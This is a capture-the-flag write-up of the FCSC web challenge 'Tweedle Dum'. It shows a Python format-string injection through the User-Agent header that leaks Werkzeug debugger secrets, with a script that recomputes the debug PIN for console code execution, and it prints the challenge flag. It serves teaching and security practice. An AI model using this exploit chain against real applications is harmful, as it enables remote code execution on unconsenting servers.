Tweedle Dum – FCSC Web Challenge Writeup
========================================

Author: (your-name-here)
Challenge: Tweedle Dum (France CyberSecurity Challenge)
Category: Web / Format String / Werkzeug Debugger RCE


1. Overview
-----------

We are given a small Flask application that runs behind Werkzeug’s debugger.
The only visible endpoint is "/" and it reflects our User-Agent into the page.

The goal:
- Find a vulnerability.
- Use it to recover the Werkzeug debugger PIN.
- Use the debugger console to get remote code execution (RCE).
- Read the flag from the filesystem.


2. Application Structure
------------------------

The provided source layout:

.
├── docker-compose.yml
├── Dockerfile
└── src
    ├── app.py
    ├── static
    │   ├── style.css
    │   └── tweedle.png
    └── templates
        └── index.html

The interesting file is `app.py`:

    from flask import Flask, request, render_template
    from werkzeug.middleware.proxy_fix import ProxyFix
    from werkzeug.debug import DebuggedApplication

    # No bruteforce needed, this is just here so you don't lock yourself or others out by accident
    DebuggedApplication._fail_pin_auth = lambda self: None

    app = Flask(__name__)

    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

    @app.route("/")
    def hello_agent():
        ua = request.user_agent
        return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))


The template `index.html` contains:

    <div id="bubble">{{ msg }}</div>


3. First Look: Not SSTI, But Something Subtle
---------------------------------------------

The template itself is safe: the `msg` variable is rendered normally in Jinja2,
and there is no direct template injection (SSTI) on `ua`.

The interesting part is this line in `app.py`:

    msg = f"Hello {ua}".format(ua=ua)

This is a "double format" situation:

1) f-string:      f"Hello {ua}"
2) .format(...):  "...{ua}...".format(ua=ua)

This opens a **format string injection** possibility, not an SSTI.


4. Why This Is a Format String Vulnerability
--------------------------------------------

Let’s clarify with a simpler Python example.

Example 1: f-string only

    >>> ua = "vozec"
    >>> f"Hello {ua}"
    'Hello vozec'

Example 2: .format only

    >>> ua = "vozec"
    >>> "Hello {ua}".format(ua=ua)
    'Hello vozec'

In our challenge, the code is logically similar to:

    "Hello {ua}".format(ua=ua)

but the attacker controls what is inside `{}` by sending a specially crafted
User-Agent header.

Payload idea:

    User-Agent: {ua.__class__}

This means that when Python processes the `.format(ua=ua)` call, it will
evaluate the expression between `{` and `}` on the `ua` object, giving us
access to attributes and nested objects.


5. Confirming Code Execution in the Format String
-------------------------------------------------

We can confirm the behavior with:

    curl https://tweedle-dum.france-cybersecurity-challenge.fr/ \
      -H "User-Agent:{ua.__class__}"

The output in the bubble is:

    Hello lass 'werkzeug.user_agent.UserAgent'>

So the server effectively did something like:

    "Hello {ua.__class__}".format(ua=<UserAgent object>)

And replaced `{ua.__class__}` by the result of accessing that attribute.

We now have arbitrary attribute access on the `ua` object and on its globals,
which is enough to start walking the Python object graph.


6. From Format String to Werkzeug Debugger
------------------------------------------

In the HTML source of `/`, there’s a commented link:

    <!-- <a href="/console">Werkzeug console</a> -->

Browsing to `/console` shows a Werkzeug debugger page which asks for a PIN.

We also see in the Dockerfile that Flask is started with debug mode:

    CMD ["flask", "run", "--host=0.0.0.0", "--port=2202", "--debug"]

And in `app.py`, this line:

    DebuggedApplication._fail_pin_auth = lambda self: None

This disables the usual penalty (sleep) for incorrect PIN attempts, so
we don’t get locked out. It’s a hint that this challenge is about obtaining
the correct PIN, not brute forcing it.


7. How Werkzeug Generates the Debug PIN
---------------------------------------

Werkzeug’s debug PIN is generated using a mixture of public and private data.
The relevant code (simplified) looks like this:

    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    private_bits = [
        str(uuid.getnode()),
        get_machine_id(),
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
        h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # format "12345-678-901" style
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

So we need:

- username
- modname
- app.__name__
- app.__file__
- uuid.getnode()
- get_machine_id()


8. Recovering the "public" bits
-------------------------------

8.1 username

Look at the Dockerfile:

    USER guest

So:

    username = "guest"

8.2 modname

For Werkzeug’s debug, this is:

    modname = "flask.app"

8.3 app.__name__

The Flask app is created as:

    app = Flask(__name__)

In this context, Werkzeug uses:

    app.__name__ == "Flask"

8.4 app.__file__

We need the file path of Flask’s main app module. One easy way is to trigger
an error and inspect the stacktrace (in verbose debug output).

Send a clearly invalid payload:

    User-Agent: {ua.__class__.vozec}

The error page / stacktrace reveals something like:

    app.__file__ = "/usr/local/lib/python3.10/site-packages/flask/app.py"

So the probably_public_bits are:

    probably_public_bits = [
        "guest",
        "flask.app",
        "Flask",
        "/usr/local/lib/python3.10/site-packages/flask/app.py",
    ]


9. Recovering the "private" bits with Format String Injection
-------------------------------------------------------------

The tricky part is leaking:

- uuid.getnode()  -> stored in werkzeug.debug.uuid._node
- get_machine_id() -> stored in werkzeug.debug._machine_id

We must use the format string injection on `ua` to walk from `ua` to the
`sys` module, then to `werkzeug.debug`, and finally to these variables.


9.1 Finding a path to sys.modules
---------------------------------

We know that many objects in Python have references to their globals, which
eventually include the `sys` module. For example:

    <function something>.__globals__['sys']

For the `ua` object, we can inspect its class and its methods.

The key idea:

    ua.__class__.__init__.__globals__['sys']

If `t` is the name of some global variable that points to `sys`, we can do:

    {ua.__class__.__init__.__globals__[t].modules['werkzeug.debug']}

In this challenge, we already know a working access pattern, so we can use
payloads like:

    {ua.__class__.__init__.__globals__['sys']}

to confirm we see the `sys` module:

Payload:

    User-Agent: {ua.__class__.__init__.__globals__['sys']}

The bubble output should show something like:

    Hello <module 'sys' (built-in)>


9.2 Accessing werkzeug.debug and the private bits
-------------------------------------------------

Once we have `sys`, we can reach the loaded module `werkzeug.debug` via
`sys.modules`:

Payload to get werkzeug.debug:

    User-Agent: {ua.__class__.__init__.__globals__['sys'].modules['werkzeug.debug']}

Now we can target the two internal variables:

1) `_machine_id`:

    User-Agent: {ua.__class__.__init__.__globals__['sys'].modules['werkzeug.debug']._machine_id}

2) `uuid._node`:

    User-Agent: {ua.__class__.__init__.__globals__['sys'].modules['werkzeug.debug'].uuid._node}

Each request will return the value inside the `Hello ...` bubble. We can parse
these responses programmatically to feed them into our local copy of the
PIN-generation algorithm.


10. Automating the Leak and PIN Generation
------------------------------------------

We can write a script to:

- Send a GET request with a crafted User-Agent payload.
- Parse the response to extract the text after "Hello ".
- Compute the same SHA1-based PIN as Werkzeug.

Example script (adapt to your URL / paths):

    import requests
    import re
    import html
    import hashlib
    from itertools import chain

    URL = "https://tweedle-dum.france-cybersecurity-challenge.fr/"

    def render(payload: str) -> str:
        r = requests.get(URL, headers={"User-Agent": payload})
        r.raise_for_status()
        m = re.search(r'Hello (.*?)</div>', r.text)
        if not m:
            raise RuntimeError("Could not find Hello ... in the response")
        return html.unescape(m.group(1))

    # Leak _machine_id (string representation)
    machine_id = render(
        r"{ua.__class__.__init__.__globals__['sys'].modules['werkzeug.debug']._machine_id}"
    )

    # Leak uuid._node (something like an integer, we might get it as a string repr)
    uuid_node = render(
        r"{ua.__class__.__init__.__globals__['sys'].modules['werkzeug.debug'].uuid._node}"
    )

    # Convert, if needed
    # Example: uuid_node might be "2485378023426"
    uuid_node = int(uuid_node)

    probably_public_bits = [
        "guest",
        "flask.app",
        "Flask",
        "/usr/local/lib/python3.10/site-packages/flask/app.py",
    ]

    private_bits = [
        str(uuid_node),
        machine_id,
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
        h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

    pin = None
    for group_size in (5, 4, 3):
        if len(num) % group_size == 0:
            pin = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    if pin is None:
        pin = num

    print("Werkzeug PIN:", pin)

Running a similar script locally in my case produced something like:

    927-752-565

This is the PIN we will use on `/console`.


11. Accessing the Werkzeug Console
----------------------------------

Go to:

    https://tweedle-dum.france-cybersecurity-challenge.fr/console

Enter the PIN we computed (e.g., `927-752-565`). The Werkzeug interactive
console should now unlock, presenting a Python prompt.


12. From Debug Console to RCE and Flag
--------------------------------------

Inside the console we have Python code execution in the context of the Flask
app. We can import `os` and explore the filesystem.

At first, trying to use `os` without importing it fails:

    >>> print(os.listdir('/'))
    NameError: name 'os' is not defined

So we import it:

    >>> import os
    >>> print(os.listdir('/'))
    ['app', '...']

Now locate the flag under `/app`:

    >>> import os
    >>> files = os.listdir('/app')
    >>> [f for f in files if f.startswith('flag-') and f.endswith('.txt')]
    ['flag-XXXX.txt']  # example

Read the flag:

    >>> import os
    >>> flag_file = [f for f in os.listdir('/app') if f.startswith('flag-') and f.endswith('.txt')][0]
    >>> print(open('/app/' + flag_file, 'r').read())
    FCSC{9430d095589535ddf50fd070a9baad98a7203fd4cdd029b8ffc5c6ebb512f934}


13. Auxiliary Script: Character Testing for Globals
---------------------------------------------------

During the exploration phase, it can be useful to brute test which keys
inside `__globals__` are valid or interesting. For instance, to see whether
`'sys'` is present as a key.

An example helper script:

    import requests
    import re
    import html

    def test_character(char):
        # Build the payload using a possible global name
        # Here we are testing single-character keys; in practice you may adapt this.
        payload = "{ua.__class__.__init__.__globals__[\"" + char + "\"]}"
        headers = {"User-Agent": payload}

        try:
            r = requests.get("http://localhost:8000/", headers=headers, timeout=2)
            if r.status_code == 200:
                if "KeyError" not in r.text and "Werkzeug Debugger" not in r.text:
                    print(f"\n[+] FOUND key '{char}'")
                    match = re.search(r'<div id="bubble">(.*?)</div>', r.text, re.DOTALL)
                    if match:
                        result = html.unescape(match.group(1).strip())
                        if result.startswith("Hello "):
                            result = result[6:]
                        print(f"    Response: {result}")
                    return True
                else:
                    print(f"[-] '{char}' -> 200 but contains error or debugger")
            else:
                print(f"[-] '{char}' -> HTTP {r.status_code}")
        except Exception as e:
            print(f"[-] '{char}' -> Exception: {e}")
        return False

    # Test an alphabet of possible keys
    for ch in "syzxtabcduvw":
        test_character(ch)

In our final exploit we already know that `'sys'` is available, so we go
directly with:

    {ua.__class__.__init__.__globals__['sys']}


14. Summary
-----------

- The challenge revolves around a subtle **format string injection** in
  Python’s `.format()` usage combined with an f-string.
- Injecting expressions like `{ua.__class__}` in the `User-Agent` header
  proves we can access arbitrary attributes of the Flask `UserAgent` object.
- By traversing from `ua` to function `__globals__` to `sys.modules`, we
  reach the `werkzeug.debug` module and leak its global variables
  `_machine_id` and `uuid._node`.
- Together with public bits (username, module, app name, and Flask app path),
  we reconstruct the Werkzeug debug PIN locally, without brute force.
- Using that PIN on `/console` gives us an interactive Python shell in the
  context of the running app.
- From there, importing `os` and listing `/app` lets us find and read the
  flag file, obtaining the final flag:

    FCSC{9430d095589535ddf50fd070a9baad98a7203fd4cdd029b8ffc5c6ebb512f934}


End of writeup.
